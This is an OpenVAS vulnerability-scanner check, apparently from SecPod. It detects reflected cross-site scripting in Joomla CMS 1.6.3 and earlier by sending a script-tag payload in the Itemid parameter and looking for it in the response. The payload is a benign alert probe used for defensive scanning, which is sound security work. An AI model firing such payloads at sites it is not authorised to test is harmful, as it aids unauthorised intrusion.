##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_mult_xss_vuln_jun11.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla! CMS Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site.
  Impact Level: Application.";
tag_affected = "Joomla CMS version 1.6.3 and prior.";
tag_insight = "The flaws are caused by improper validation of user-supplied input via the
  'Itemid' and 'filter_order' parameters in 'index.php', before being returned
  to the user.";
tag_solution = "Upgrade to Joomla CMS 1.6.4 or later
  For updates refer to http://www.joomla.org/";
tag_summary = "This host is running Joomla and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(902390);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_bugtraq_id(48471, 48475);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Joomla! CMS Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45094");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Jun/519");

  script_description(desc);
  script_summary("Check if Joomla CMS is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

## Get HTTP Port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get installed directory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

sndReq = http_get(item:string(joomlaDir, '/index.php?option=com_contact&view' +
                 '=category&catid=26&id=36&Itemid=-1";><script>alert(/XSS-Test' +
                 'ing/)</script>'), port:joomlaPort);
rcvRes = http_send_recv(port:joomlaPort, data:sndReq);

## Check the response to confirm vulnerabilty
if(';><script>alert(/XSS-Testing/)</script>' >< rcvRes){
  security_warning(joomlaPort);
}
